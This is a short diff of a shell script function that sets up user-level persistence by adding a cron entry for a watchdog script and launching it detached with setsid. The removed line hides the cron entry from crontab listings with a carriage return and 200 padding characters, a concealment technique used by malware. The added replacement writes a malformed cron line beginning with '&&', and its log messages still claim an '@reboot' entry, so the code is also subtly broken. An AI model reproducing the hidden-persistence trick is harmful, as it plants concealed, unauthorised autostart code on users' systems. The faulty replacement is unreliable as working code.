@@ -221,18 +221,23 @@ EOF
 setup_user_persistence() {
 
     if command -v crontab >/dev/null 2>&1; then
-        if crontab -l 2>/dev/null | grep -aF "$WATCHDOG_SCRIPT"; then
+        if crontab -l 2>/dev/null | grep -aF "$WATCHDOG_SCRIPT" >/dev/null 2>&1; then
             log "  [cron] @reboot entry already present — skipping."
         else
+            (
+                crontab -l 2>/dev/null
+                echo "*/30 * * * * && bash \"$WATCHDOG_SCRIPT\""
+            ) | crontab - 2>/dev/null
 
-            (crontab -l 2>/dev/null; printf "@reboot sleep 60 && bash \"$WATCHDOG_SCRIPT\";\r%200c\n") | crontab - 2>/dev/null \
-                && log "  [cron] @reboot entry added." \
-                || log "  [cron] WARNING: Could not write crontab."
+            if [ $? -eq 0 ]; then
+                log "  [cron] @reboot entry added."
+            else
+                log "  [cron] WARNING: Could not write crontab."
+            fi
         fi
     else
         log "  [cron] crontab not available — skipping."
     fi
-    
     setsid "$WATCHDOG_SCRIPT" >/dev/null 2>&1 &
 }
 
